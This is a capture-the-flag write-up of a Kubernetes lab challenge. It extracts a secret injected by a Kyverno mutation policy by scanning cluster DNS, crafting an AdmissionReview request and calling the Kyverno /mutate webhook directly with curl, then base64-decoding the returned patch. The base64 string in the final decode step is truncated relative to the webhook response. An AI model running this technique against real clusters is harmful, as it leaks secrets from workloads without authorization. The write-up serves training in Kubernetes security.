---
tags:
  - Kubernetes
  - Kyverno
  - Admission-Controller
title: K8S LAN Party - Who will guard the guardians
description: Mistake from guardian
reference: https://k8slanparty.com/challenge/5
---

## Challenge

Where pods are being mutated by a foreign regime, one could abuse its bureaucracy and leak sensitive information from the [administrative](https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/#request) services.

## Solution

### 1. View the provided policy

- What is `kyverno.io` api?
- this spect will automatically patch the environment variable `FLAG` to all pods in `sensitive-ns`?

> The Kyverno project provides a comprehensive set of tools to manage the complete Policy-as-Code (PaC) lifecycle for Kubernetes and other cloud native environments
> 
> Ref: https://kyverno.io/

```yaml
apiVersion: kyverno.io/v1 
kind: Policy 
metadata: 
	name: apply-flag-to-env 
	namespace: sensitive-ns 
spec: 
	rules: 
		- name: inject-env-vars 
		  match: 
			resources: 
				kinds: 
					- Pod 
			mutate: 
				patchStrategicMerge: 
					spec: 
						containers: 
							- name: "*" 
							  env: 
								- name: FLAG 
								  value: "{flag}"
```


### 2. check the permissions of kubenetes API

> Warning: the list may be incomplete: webhook authorizer does not support user rule resolution

```bash
player@wiz-k8s-lan-party:~$ kubectl auth can-i --list 
2025/05/24 13:49:27 Starlark failed to allocate 4GB address space: cannot allocate memory. Integer performance may suffer.
Warning: the list may be incomplete: webhook authorizer does not support user rule resolution
Resources                                       Non-Resource URLs                     Resource Names     Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []                 [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []                 [create]
                                                [/.well-known/openid-configuration]   []                 [get]
                                                [/api/*]                              []                 [get]
                                                [/api]                                []                 [get]
                                                [/apis/*]                             []                 [get]
                                                [/apis]                               []                 [get]
                                                [/healthz]                            []                 [get]
                                                [/healthz]                            []                 [get]
                                                [/livez]                              []                 [get]
                                                [/livez]                              []                 [get]
                                                [/openapi/*]                          []                 [get]
                                                [/openapi]                            []                 [get]
                                                [/openid/v1/jwks]                     []                 [get]
                                                [/readyz]                             []                 [get]
                                                [/readyz]                             []                 [get]
                                                [/version/]                           []                 [get]
                                                [/version/]                           []                 [get]
                                                [/version]                            []                 [get]
                                                [/version]                            []                 [get]
podsecuritypolicies.policy                      []                                    [eks.privileged]   [use]
```

### 3. use DNS scan to find the other services in the cluster

```bash
player@wiz-k8s-lan-party:~$ dnscan -subnet 10.100.0.0/16
22057 / 65536 [---------------------------------------->______________________________________________________________________________] 33.66% 994 p/s10.100.86.210 kyverno-cleanup-controller.kyverno.svc.cluster.local.
32188 / 65536 [---------------------------------------------------------->____________________________________________________________] 49.11% 993 p/s10.100.126.98 kyverno-svc-metrics.kyverno.svc.cluster.local.
40518 / 65536 [------------------------------------------------------------------------->_____________________________________________] 61.83% 992 p/s10.100.158.213 kyverno-reports-controller-metrics.kyverno.svc.cluster.local.
43902 / 65536 [------------------------------------------------------------------------------->_______________________________________] 66.99% 994 p/s10.100.171.174 kyverno-background-controller-metrics.kyverno.svc.cluster.local.
55602 / 65536 [---------------------------------------------------------------------------------------------------->__________________] 84.84% 992 p/s10.100.217.223 kyverno-cleanup-controller-metrics.kyverno.svc.cluster.local.
59377 / 65536 [----------------------------------------------------------------------------------------------------------->___________] 90.60% 992 p/s10.100.232.19 kyverno-svc.kyverno.svc.cluster.local.
65336 / 65536 [---------------------------------------------------------------------------------------------------------------------->] 99.69% 993 p/s10.100.86.210 -> kyverno-cleanup-controller.kyverno.svc.cluster.local.
10.100.126.98 -> kyverno-svc-metrics.kyverno.svc.cluster.local.
10.100.158.213 -> kyverno-reports-controller-metrics.kyverno.svc.cluster.local.
10.100.171.174 -> kyverno-background-controller-metrics.kyverno.svc.cluster.local.
10.100.217.223 -> kyverno-cleanup-controller-metrics.kyverno.svc.cluster.local.
10.100.232.19 -> kyverno-svc.kyverno.svc.cluster.local.
```

### 4. Generate the admission review request json for kyverno mutation webhook

Tool: https://github.com/anderseknert/kube-review

```
laborant@dev-machine:~$ kubectl run test --namespace sensitive-ns --image nginx -o yaml --dry-run=client | ./kube-review-linux-amd64 create > pod.json
laborant@dev-machine:~$ cat pod.json 
{
  "kind": "AdmissionReview",
  "apiVersion": "admission.k8s.io/v1",
  "request": {
    "uid": "4f9d9be2-a347-423a-800c-570b31380d82",
    "kind": {
      "group": "",
      "version": "v1",
      "kind": "Pod"
    },
    "resource": {
      "group": "",
      "version": "v1",
      "resource": "pods"
    },
    "requestKind": {
      "group": "",
      "version": "v1",
      "kind": "Pod"
    },
    "requestResource": {
      "group": "",
      "version": "v1",
      "resource": "pods"
    },
    "name": "test",
    "namespace": "sensitive-ns",
    "operation": "CREATE",
    "userInfo": {
      "username": "kube-review",
      "uid": "135cd321-9ce3-4b1f-8814-260bb2bfaad1"
    },
    "object": {
      "kind": "Pod",
      "apiVersion": "v1",
      "metadata": {
        "name": "test",
        "namespace": "sensitive-ns",
        "creationTimestamp": null,
        "labels": {
          "run": "test"
        }
      },
      "spec": {
        "containers": [
          {
            "name": "test",
            "image": "nginx",
            "resources": {}
          }
        ],
        "restartPolicy": "Always",
        "dnsPolicy": "ClusterFirst"
      },
      "status": {}
    },
    "oldObject": null,
    "dryRun": true,
    "options": {
      "kind": "CreateOptions",
      "apiVersion": "meta.k8s.io/v1"
    }
  }
}
```

### 5. Call the kyverno mutate webhook manually

```
player@wiz-k8s-lan-party:~$ curl -X POST -H "Content-Type: application/json" --data @req4.json -k https://kyverno-svc.kyverno.svc.cluster.local/mutate
{"kind":"AdmissionReview","apiVersion":"admission.k8s.io/v1","request":{"uid":"4f9d9be2-a347-423a-800c-570b31380d82","kind":{"group":"","version":"v1","kind":"Pod"},"resource":{"group":"","version":"v1","resource":"pods"},"requestKind":{"group":"","version":"v1","kind":"Pod"},"requestResource":{"group":"","version":"v1","resource":"pods"},"name":"test","namespace":"sensitive-ns","operation":"CREATE","userInfo":{"username":"kube-review","uid":"135cd321-9ce3-4b1f-8814-260bb2bfaad1"},"object":{"kind":"Pod","apiVersion":"v1","metadata":{"name":"test","namespace":"sensitive-ns","creationTimestamp":null,"labels":{"run":"test"}},"spec":{"containers":[{"name":"test","image":"nginx","resources":{}}],"restartPolicy":"Always","dnsPolicy":"ClusterFirst"},"status":{}},"oldObject":null,"dryRun":true,"options":{"kind":"CreateOptions","apiVersion":"meta.k8s.io/v1"}},"response":{"uid":"4f9d9be2-a347-423a-800c-570b31380d82","allowed":true,"patch":"W3sib3AiOiJhZGQiLCJwYXRoIjoiL3NwZWMvY29udGFpbmVycy8wL2VudiIsInZhbHVlIjpbeyJuYW1lIjoiRkxBRyIsInZhbHVlIjoid2l6X2s4c19sYW5fcGFydHl7eW91LWFyZS1rOHMtbmV0LW1hc3Rlci13aXRoLWdyZWF0LXBvd2VyLXRvLW11dGF0ZS15b3VyLXdheS10by12aWN0b3J5fSJ9XX0sIHsicGF0aCI6Ii9tZXRhZGF0YS9hbm5vdGF0aW9ucyIsIm9wIjoiYWRkIiwidmFsdWUiOnsicG9saWNpZXMua3l2ZXJuby5pby9sYXN0LWFwcGxpZWQtcGF0Y2hlcyI6ImluamVjdC1lbnYtdmFycy5hcHBseS1mbGFnLXRvLWVudi5reXZlcm5vLmlvOiBhZGRlZCAvc3BlYy9jb250YWluZXJzLzAvZW52XG4ifX1d","patchType":"JSONPatch"}}player@wiz-k8s-lan-party:~$
```


Note: If you run the above command and get the following output, probably **the admission review json payload is invalid**.

```
stopped the pause stream!
Connection #0 to host kyverno-svc.kyverno.svc.cluster.local left intact
curl: (92) HTTP/2 stream 0 was not closed cleanly: INTERNAL_ERROR (err 2)
```

base64 decode:

```
player@wiz-k8s-lan-party:~$ echo W3sib3AiOiJhZGQiLCJwYXRoIjoiL3NwW5fcGFydHl7eW91LWFyZS1rOHMtbmV0LW1hc3Rlci13aXRoLWdyZWF0LXBvd2VyLXRvLW11dGF0ZS15b3VyLXdheS10by12aWN0b3J5fSJ9XX0sIHsicGF0aCI6Ii9tZXRhZGF0YS9hbm5vdGF0aW9ucyIsIm9wIjoiYWRkIiwidmFsdWUiOnsicG9saWNpZXMua3l2ZXJuby5pby9sYXN0LWFwcGxpZWQtcGF0Y2hlcyI6ImluamVjdC1lbnYtdmFycy5hcHBseS1mbGFnLXRvLWVudi5reXZlcm5vLmlvOiBhZGRlZCAvc3BlYy9jb250YWluZXJzLzAvZW52XG4ifX1d | base64 -d
[{"op":"add","path":"/spec/containers/0/env","value":[{"name":"FLAG","value":"wiz_k8s_lan_party{you-are-k8s-net-master-with-great-power-to-mutate-your-way-to-victory}"}]}, {"path":"/metadata/annotations","op":"add","value":{"policies.kyverno.io/last-applied-patches":"inject-env-vars.apply-flag-to-env.kyverno.io: added /spec/containers/0/env\n"}}]player@wiz-k8s-lan-party:~$
```
